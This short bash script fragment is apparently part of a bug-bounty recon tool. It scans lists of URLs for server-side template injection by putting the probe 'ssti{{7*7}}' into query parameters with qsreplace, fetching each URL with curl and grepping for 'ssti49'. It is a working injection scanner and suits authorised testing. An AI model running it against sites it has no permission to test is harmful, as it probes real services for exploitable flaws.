#SSTI-------------------------------------------------------------------------------------





echo	"1. qsreplace_ssti (urls.txt parameters_paramspider.txt)   2. qsreplace_ssti (.txt)   "	

mkdir results/ssti	
echo -n "\n\nEnter the respective number from the list that you want to use: "
read number
echo ""

case $number in
	1)
                                #Exploit  
                                cat urls.txt parameters_paramspider.txt | gf ssti | qsreplace "ssti{{7*7}}"  |  while read url; do cur=$(curl -s $url  | grep "ssti49"); echo -e "$url -> $cur";done | tee ssti.txt
 
                                #move file
                                mv ssti.txt results/ssti

		;;

	2)
                                echo -n "Enter the file name (*.txt) : "
				read file
                                echo -n "Enter the payload (ssti{{7*7}}) : "
				read payload
           
				#Exploit
				cat $file | gf ssti | qsreplace "$payload"  |  while read url; do cur=$(curl -s $url  | grep "ssti49"); echo -e "$url -> $cur";done | tee ssti_random-file.txt
 
                                #move file
                                mv ssti_random-file.txt results/ssti
		;;
          
	
                *)
                        echo "Please give valid choice!!!"
		;;

esac










#SSTI-------------------------------------------------------------------------------------
